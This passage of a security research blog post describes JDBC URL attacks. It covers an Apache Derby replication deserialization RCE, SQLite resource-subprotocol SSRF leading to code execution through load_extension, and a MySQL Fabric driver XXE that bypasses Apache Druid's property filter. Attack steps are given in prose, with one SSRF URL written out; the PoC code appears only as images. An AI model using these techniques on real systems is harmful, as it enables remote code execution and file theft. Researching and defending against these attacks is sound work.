+<p>As you can guess from the class names and package names. These code fragments are relate to <code>Apache Derby</code> feature to replicate databases. I go through the <code>Apache Derby</code> documentation section on replicating databases and know that database replication can be initiated with JDBC connection property, which is exactly what we need. Also the connection property is controllable.</p>
+<p>In fact, if you go all the way up the call chain, you can see that whether this thread is started depends on whether the <code>startMaster</code> property is enabled. As the code showing, <code>isStartReplicationMasterBoot</code> method used for judgment. And in the code ,we can find that we can specify which host the socket connects to by controlling the <code>slaveHost</code> property. So we can set the <code>startMaster</code> property as <code>true</code> and the <code>slaveHost</code> property to the malicious server, then <code>Apache Derby</code> will try to connect to the malicious slave server and communicate with each other. At this point, the responsed malicious serialization data stream will be automatically deserialized, thus achieving the RCE purpose. </p>
+<p><img src="/images/pasted-207.png" alt="upload successful"></p>
+<p>The malicious connection PoC in the following code</p>
+<p><img src="/images/pasted-208.png" alt="upload successful"></p>
+<p>And the evil slave sever code is as follows</p>
+<p><img src="/images/pasted-209.png" alt="upload successful"></p>
+<p>Obviously the evil slave sever can return the serialized data directly after the connection receiving.</p>
+<h5 id="SQLite-RCE-with-JDBC-Driver"><a href="#SQLite-RCE-with-JDBC-Driver" class="headerlink" title="SQLite RCE with JDBC Driver"></a>SQLite RCE with JDBC Driver</h5><p>SQLite is also a lightweight embedded database. How to exploit it?</p>
+<p><img src="/images/pasted-170.png" alt="upload successful"></p>
+<p>we look up the code for its connection and find that when the JDBC URL is controllable, then we can customize its <code>resourceName</code> in the <code>open</code> method as follows </p>
+<p><img src="/images/pasted-181.png" alt="upload successful"></p>
+<p>Stepping into the <code>extractResource</code> method, we can see that the URL  constructed by <code>resourceName</code> calls <code>openStream</code> method , so this can be used to achieve the SSRF attack as follow,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:sqlite::resource:http://127.0.0.1:8888/poc1.db</span><br></pre></td></tr></table></figure>
+
+<p>Send an HTTP request to specific ip address with JDBC connection. However, SSRF attack is not stratified our purpose. </p>
+<p><img src="/images/pasted-172.png" alt="upload successful"></p>
+<p>Using the resource subprotocol of SQLite, you can connect to the specified IP to download the specific database files, that is, if the JDBC URL is under our control, we can control the database files which the client side opens.With these clues, how should we attack? </p>
+<p><img src="/images/pasted-210.png" alt="upload successful"></p>
+<p>Referring to <code>&lt;SELECT code_execution FROM * USING SQLite&gt;</code> which descripts how to gain code execution using a malicious SQLite database. We can consider a scenario that there is a controllable JDBC URL and an uncontrollable <code>SELECT</code> statement. </p>
+<p>A brief code is shown in the figure. The URL is controllable, but the SQL statement executed are not controllable. </p>
+<p><img src="/images/pasted-211.png" alt="upload successful"></p>
+<p>In the controllable database file, there is a <code>Data Definition Languae (DDL)</code> statements used to <code>CREATE TABLE</code> or <code>VIEW</code>. The DDL statements actually appear as a plain text. If we inspect that the uncontrollable statement is <code>SELECT * from TABLE</code>, we can <code>CREATE VIEW</code> names <code>pyn3rd</code> to hijack the <code>SELECT</code> statement to execute a subquery customized in the <code>CREATE VIEW</code> DDL file. In this way, we can transform the SQL statement that we cannot control into the query statement that we can control. </p>
+<p><img src="/images/pasted-212.png" alt="upload successful"></p>
+<p>The next step, if we have a controllable JDBC URL connection, we can enable the <code>load_extension</code> option in SQLite. So if we have a controlled file, we can archive RCE purpose by loading this extension. In fact, the extension is a <code>Dynamic Link Library</code> or <code>Shared Object</code>. In <code>SELECT</code> statement, <code>load_extension</code> function can load a <code>.ddl</code> or <code>.so</code> file and execute <code>sqlite3_extension_init</code> function in it. So input the malicious code in <code>sqlite3_extension_init</code> function can trigger the remote code excution.</p>
+<p><img src="/images/pasted-178.png" alt="upload successful"></p>
+<p>Actually getting a manageable file is not always easy. Since Sqlite often bursts memory corruptions vulnerabilities, we can use these memory corruptions to attack. As shown in the code bellow, we can use <code>Magellan</code> PoC to create a local SQLite database with a malicious security <code>VIEW</code>.</p>
+<p><img src="/images/pasted-179.png" alt="upload successful"></p>
+<p>The <code>Magellan</code> is a number of vulnerabilities that exist in SQLite caused by memory corruptions.Specify a JDBC connection to download our database file and open it. When the code executes to query for security table, it will trigger a JVM crash.</p>
+<p><img src="/images/pasted-180.png" alt="upload successful"></p>
+<p>However, RCE is the final objective. Here is the PoC</p>
+<p><img src="/images/pasted-212.png" alt="upload successful"></p>
+<h5 id="Open-Source-Project-JDBC-Attack-Defense-Policy"><a href="#Open-Source-Project-JDBC-Attack-Defense-Policy" class="headerlink" title="Open Source Project JDBC Attack Defense Policy"></a>Open Source Project JDBC Attack Defense Policy</h5><p>According to the previous attack methods, we can find that vulnerabilities usually appear in some special JDBC properties. So some open source projects take the method of filtering sensitive properties to fix such vulnerabilities. <code>Apache Druid</code> as well as <code>Apache DolphinScheduler</code> have been exposed to MySQL JDBC deserialization vulnerabilities in the past, so we focus on the two open source softwares . The CVE numbers for the two vulnerabilities are <code>CVE-2021-26919</code> and <code>CVE-2020-11974</code>.</p>
+<p><code>Apache Druid</code> defines a whitelist of properties. Only the properties in the whitelist are permitted.</p>
+<p><img src="/images/pasted-184.png" alt="upload successful"></p>
+<p>Otherwise, <code>Apache DolphinScheduler</code> removes sensitive properties from parameters. </p>
+<p><img src="/images/pasted-185.png" alt="upload successful"></p>
+<ul>
+<li>Is there a new exploitable way to bypass property filter?</li>
+</ul>
+<p>We choose <code>Apache Druid</code>, which uses the <code>MySQL-connector-5.1.48</code> as our target. For this fix, the first idea is to see if the filter parameters method is consistent with the JDBC connection processing parameters method. </p>
+<p><img src="/images/pasted-187.png" alt="upload successful"></p>
+<p>You can see in the <code>Apache Druid</code> source code that the filter use the MySQL connector default parse URL method.By default they are consistent. </p>
+<p><img src="/images/pasted-188.png" alt="upload successful"></p>
+<p>Therefore, we jump out of this idea and take a look at the overall JDBC Driver loading logic.</p>
+<p>For the loading of JDBC Driver, they use SPI technology.full name is  Java Service Provider Interface. For JDBC, all registered drivers are stored in the <code>java.sql.Driver</code>.In 5.1.48 versions of MySQL connector ,there are two registerd drivers, one is the common JDBC driver, the other is <code>FabricMySQLDriver</code>.</p>
+<p><img src="/images/pasted-189.png" alt="upload successful"></p>
+<p>This <code>FabricMySQLDriver</code> has caught our attention. Refer to the MySQL driver documentation, you can see that <code>FabricMySQLDriver</code> is used to connect to the MySQL Fabric System. MySQL Fabric is a system for managing a farm of MySQL servers. </p>
+<p><img src="/images/pasted-190.png" alt="upload successful"></p>
+<p>We start researching in the source code of <code>FabricMySQLDriver</code>.If you pass in a URL that starts with the format as the code showing, it goes into the <code>Fabric Driver</code> processing logic. </p>
+<p><img src="/images/pasted-192.png" alt="upload successful"></p>
+<p>You can see that in the code the connection URL is concated by the <code>FabricProtocol</code>, <code>Host</code> and <code>Port</code> parameters. Trace the FabricProtocol parameter,We can  find that it is default to HTTP protocol . Enter the FabricConnection method, In this case, you can see that it uses the XMLRPC Client.</p>
+<p><img src="/images/pasted-193.png" alt="upload successful"></p>
+<p>Continuing to step into it, we find that it finally makes an XMLRPC call in the <code>errorSafeCall</code> Method and we can specify  host and port of this call. </p>
+<p><img src="/images/pasted-194.png" alt="upload successful"></p>
+<p>So it looks like we’ve got an SSRF vulnerability, but it’s not enough. Similar to the MySQL deserialization vulnerability, we go on seeing if the Fabric MySQL driver had made any errors during processing the revieved data.</p>
+<p><img src="/images/pasted-195.png" alt="upload successful"></p>
+<p>It is clearly visible in the code that it use the <code>newSAXParser</code> method of the <code>SAXParserFactory</code> directly to get a <code>SAXParser</code>, where the <code>SAXParserFactory</code> does not set any security attributes, is an obvious XXE vulnerability, which finally can cause an arbitity file reading or SSRF attack.</p>
+<p><img src="/images/pasted-196.png" alt="upload successful"></p>
+<p>So the idea of attack is very clear. We construct a specific JDBC URL to enter the processing logic of <code>Farbic Driver</code>, set the <code>Host</code> and <code>Port</code> in the JDBC URL to our malicious HTTP server and when the client establishes a connection, it will send an XMLRPC request to the server. We control the HTTP server to return a malicious XML document ,and then XXE vulnerability will be triggered when the client processes this XML Documnet. We can read the corresponding files from the client by using the out-of-band XML External Entity attack.</p>
+<p>The connection code of the client is shown in the figure. We can trigger the XXE vulnerability without any parameters. </p>
+<p><img src="/images/pasted-197.png" alt="upload successful"></p>
+<p>The malicious HTTP service code is shown as follows.To constrocut the mailicious XML Documnet is easy.</p>
+<p><img src="/images/pasted-198.png" alt="upload successful"></p>
+<h5 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h5><p>We have researched on JDBC attacks of the diverse main stream databases for a couple of weeks.Making the JDBC URLs customized will carry a big risk.It is recommended that if you have to make JDBC URLs customized, you should  strictly restrict the JDBC URLs either properties or protocols.</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-Forewords"><span class="toc-number">1.</span> <span class="toc-text">0x01 Forewords</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-JDBC-Introduction"><span class="toc-number">2.</span> <span class="toc-text">0x02 JDBC Introduction</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x03-Review-Historical-Issues"><span class="toc-number">3.</span> <span class="toc-text">0x03 Review Historical Issues</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#MySQL-Client-Arbitrary-File-Reading-Vulnerability"><span class="toc-number">3.1.</span> <span class="toc-text">MySQL Client Arbitrary File Reading Vulnerability</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#MySQL-JDBC-Client-Deserialization-Vulnerability"><span class="toc-number">3.2.</span> <span class="toc-text">MySQL JDBC Client Deserialization Vulnerability</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Weblogic-RCE-involving-MySQL-JDBC-Deserialization"><span class="toc-number">3.3.</span> <span class="toc-text">Weblogic RCE involving MySQL JDBC Deserialization</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SpringBoot-H2-Console-RCE-with-JDBC-Driver"><span class="toc-number">3.4.</span> <span class="toc-text">SpringBoot H2 Console RCE with JDBC Driver</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JBoss-Wildfly-Server-Console-RCE-with-JDBC-Driver"><span class="toc-number">4.</span> <span class="toc-text">JBoss &#x2F;Wildfly Server Console RCE with JDBC Driver</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#IBM-DB2-RCE-with-JDBC-Driver"><span class="toc-number">4.1.</span> <span class="toc-text">IBM DB2 RCE with JDBC Driver</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ModeShape-RCE-with-JDBC-Driver"><span class="toc-number">4.2.</span> <span class="toc-text">ModeShape RCE with JDBC Driver</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Apache-Derby-with-JDBC-Driver"><span class="toc-number">4.3.</span> <span class="toc-text">Apache Derby with JDBC Driver</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLite-RCE-with-JDBC-Driver"><span class="toc-number">5.</span> <span class="toc-text">SQLite RCE with JDBC Driver</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Open-Source-Project-JDBC-Attack-Defense-Policy"><span class="toc-number">6.</span> <span class="toc-text">Open Source Project JDBC Attack Defense Policy</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Conclusion"><span class="toc-number">7.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&text=Make JDBC Attacks Great Again I"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&title=Make JDBC Attacks Great Again I"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&is_video=false&description=Make JDBC Attacks Great Again I"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Make JDBC Attacks Great Again I&body=Check out this article: https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&title=Make JDBC Attacks Great Again I"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&title=Make JDBC Attacks Great Again I"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&title=Make JDBC Attacks Great Again I"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&title=Make JDBC Attacks Great Again I"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&name=Make JDBC Attacks Great Again I&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/&t=Make JDBC Attacks Great Again I"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2016-2024
+        pyn3rd
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">Home</a></li><!--
+        --><!--
+          --><li><a href="/archives/">Archives</a></li><!--
+        --><!--
+          --><li><a href="/search/">Search</a></li><!--
+        --><!--
+          --><li><a href="/about/">About</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <span id="busuanzi_container_site_pv">
+                  Views <span id="busuanzi_value_site_pv"></span>
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                  Visitors <span id="busuanzi_value_site_uv"></span>
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'pyn3rd/pyn3rd.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
